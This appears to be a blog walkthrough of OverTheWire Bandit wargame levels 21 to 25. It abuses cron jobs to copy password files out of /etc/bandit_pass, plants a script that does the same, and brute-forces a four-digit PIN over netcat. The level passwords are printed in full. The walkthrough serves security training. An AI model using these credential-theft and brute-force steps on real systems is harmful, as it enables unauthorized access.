---
title: "Bandit Wargame 20-30 Walkthrough"
date: 2026-01-28
---

Bandit21
  We can see opening the crontab that there's a script that runs all the time:

```
bandit21@bandit:/etc/cron.d$ ls
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```
Opening the script we see that it changes the permission of a file in /tmp so that everybody has atleast read permission and put the password of the next level into it:
```
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```

Opening the file gives us the password:
```
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

Done.

Bandit22:
  The same as last one. When we open the bash script that executes we find this:
```
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

So basically it calculate the hash of the string "I am user bandit23" and puts the password in a file by the name of the hash. We calculate the hash ourselves and then we find the file:
```
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum
8ca319486bfbbc3663ea0fbe81326349  -

bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

Bandit23:
  Same, except this time we get to write the script that's going to run:
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 >> /tmp/dir852147/password.txt

```
Simple and effective. at first nothing worked, but I kept giving permission to every file and folder until finally:
```
bandit23@bandit:/tmp/dir852147$ cat password.txt 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

Bandit24:
  I wrote a script that generate all the possible combinations that he asked for it then open them in a netcat connection like this:
```
bandit24@bandit:/tmp/852258$ cat cracker.sh
#!/bin/bash

for i in $(seq 1 9999);
do

        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> combs.txt

done

nc localhost 30002 < combs.txt >> results.txt
```

Opening the results file gets us the password:
```
bandit24@bandit:/tmp/852258$ cat reults.txt
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
...
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

Bandit25: 
  Logging into bandit 26 using the ssh key gets us kicked out as soon as we logged in. I feel like I am getting deja vu, huh. Strange.
